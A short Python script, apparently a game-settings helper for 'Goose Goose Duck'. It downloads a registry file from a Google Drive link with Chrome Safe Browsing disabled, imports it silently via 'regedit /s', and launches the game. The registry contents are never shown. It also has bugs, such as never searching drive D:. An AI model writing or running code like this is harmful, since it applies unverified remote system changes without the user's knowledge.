import os
import subprocess
import shutil
import logging
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

settings_url = "https://drive.google.com/uc?export=download&id=1IGENwFzLm8bBEboISadYSNEdxbnjz1fH"

def download_file(url, directory):
    service = Service(ChromeDriverManager().install())

    chrome_options = Options()
    chrome_options.add_experimental_option("prefs", {"safebrowsing.enabled": "false"})

    driver = webdriver.Chrome(service=service, options=chrome_options)

    driver.get(url)
    time.sleep(2)

    download_button = driver.find_element(By.ID, "uc-download-link")
    download_button.click()

    time.sleep(3)
    driver.quit()

    downloads_path = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
    downloaded_file = os.path.join(downloads_path, "settings.reg")
    return shutil.move(downloaded_file, directory)

def import_registry_settings(reg_file):
    try:
        if os.path.exists(reg_file):
            subprocess.run(['regedit.exe', '/s', reg_file], check=True)
            logger.info("Настройки реестра успешно импортированы")
        else:
            logger.error(f"Файл реестра '{reg_file}' не найден")
    except Exception as e:
        logger.error(f"Произошла ошибка при импорте настроек реестра: {e}")

def find_game_dir():
    for root, dirs, files in (os.walk("C:\\") or os.walk("D:\\")):
        for dir in dirs:
            if "Goose Goose Duck" in dir:
                return os.path.join(root, dir)
    return None

def launch_game(game_path):
    subprocess.Popen([game_path])

if __name__ == "__main__":

    game_dir = find_game_dir()

    settings_file = download_file(settings_url, game_dir)

    if settings_file:
    
        import_registry_settings(settings_file)

        game_exe_path = os.path.join(game_dir, "Goose Goose Duck.exe")

        if os.path.exists(game_exe_path):
            launch_game(game_exe_path)
        else:
            logger.error("Исполняемый файл игры не найден.")

    else: 
        logger.info("Файл настроек не скачан")